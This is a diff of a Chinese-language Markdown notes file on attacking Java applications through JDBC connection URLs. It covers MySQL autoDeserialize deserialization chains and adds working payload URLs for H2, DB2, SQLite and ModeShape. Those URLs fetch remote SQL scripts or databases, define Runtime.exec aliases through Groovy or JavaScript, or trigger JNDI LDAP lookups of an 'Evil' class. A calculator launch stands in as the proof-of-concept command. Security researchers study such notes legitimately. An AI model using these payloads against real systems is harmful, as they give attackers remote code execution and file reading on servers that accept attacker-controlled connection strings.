@@ -1,8 +1,26 @@
 # JDBC攻击
 
+- [JDBC应用](#jdbc应用)
+  
+- [JDBC攻击-mysql](#jdbc攻击-mysql)
+  - [ServerStatusDiffInterceptor调用链](#serverstatusdiffinterceptor调用链)
+  - [detectCustomCollations调用链](#detectcustomcollations调用链)
+  - [payload](#payload)
+
+- [JDBC攻击-其他数据库](#jdbc攻击-其他数据库)
+  - [H2](#h2)
+  - [DB2](#db2)
+  - [SQLite](#sqlite)
+  - [ModeShape](#modeshape)
+
+- [JDBC攻击-文件读取](#jdbc攻击-文件读取)
+
+
+
+
 JDBC（Java DataBase Connectivity），是Java程序访问数据库的标准接口。常用的关系数据库包括：付费的（`Oracle、SQL Server、DB2、Sybase`）、开源的（`MySQL、PostgreSQL、Sqlite`）。JDBC接口通过JDBC驱动来访问数据库，而JDBC驱动由各个数据库厂商提供，也就是不同的数据库对应有各自的驱动。使用JDBC的好处就是不需要根据不同的数据库做开发，拥有统一的接口。
 
-## JDBC应用
+## jdbc应用
 
 假如使用MySQL的JDBC驱动，只需要在maven中引入对应的jar包。scope设置为runtime，因为编译时并不需要此jar包，只在运行期使用。
 ```
@@ -47,7 +65,7 @@ try (Connection conn = DriverManager.getConnection(JDBC_URL, JDBC_USER, JDBC_PAS
 }
 ```
 
-## JDBC攻击——反序列化
+## jdbc攻击-mysql
 
 上面提到mysql驱动的URL可选扩展参数有很多，其中一个叫做`autoDeserialize`，如果配置为true，客户端会自动反序列化服务端返回的数据。mysql-connector-java.jar中的类`com/mysql/cj/jdbc/result/ResultSetImpl.class#getObject()`方法如下。如果autoDeserialize属性值为true，就会进行反序列化操作。
 ```java
@@ -69,7 +87,7 @@ if (!(Boolean)this.connection.getPropertySet().getBooleanProperty(PropertyKey.au
 ```
 但是默认情况下客户端不会调用getObject()方法。就像找反序列化调用链一样需要找到上层的调用。
 
-### ServerStatusDiffInterceptor调用链
+### serverstatusdiffinterceptor调用链
 
 https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf这篇给出的链条如下
 ```
@@ -89,7 +107,7 @@ public static void resultSetToMap(Map mappedValues, ResultSet rs) throws SQLExce
 ```
 jdbc:mysql://attacker/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
 ```
-### detectCustomCollations调用链
+### detectcustomcollations调用链
 
 这条链最终也是走到resultSetToMap方法，核心是`com.mysql.jdbc.ConnectionImpl#buildCollationMapping()`方法，如果满足版本大于4.1.0并且detectCustomCollations值为true，就会调用到resultSetToMap方法，最终进行反序列化操作。
 ```java
@@ -137,7 +155,40 @@ Ps: 如果是读文件需要加maxAllowedPacket=655360
 # 5.0.x: 不存在ServerStatusDiffInterceptor，也不存在detectCustomCollations
 ```
 
-## JDBC攻击——文件读取
+## jdbc攻击-其他数据库
+### h2
+```
+# 远程拉取sql脚本
+jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8089/poc.sql'
+
+poc.sql: CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "run";}';CALL EXEC ('open -a Calculator.app')
+
+# Groovy
+jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'"
+
+String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")" + "})" + "def x";
+
+# jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test1 BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '" + javascript + "'"
+
+String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")";
+```
+
+### db2
+```
+jdbc:db2://127.0.0.1:5001/test:clientRerouteServerListJNDIName=ldap://ip:port/Evil;
+```
+
+### sqlite
+```
+jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db
+```
+
+### modeshape
+```
+jdbc:jcr:jndi:ldap://ip:port/Evil
+```
+
+## jdbc攻击-文件读取
 这篇文章已经说的很全了，漏洞定位`com.mysql.jdbc.MysqlIO#sendFileToServer`
 https://lorexxar.cn/2020/01/14/css-mysql-chain/#Load-data-infile
 
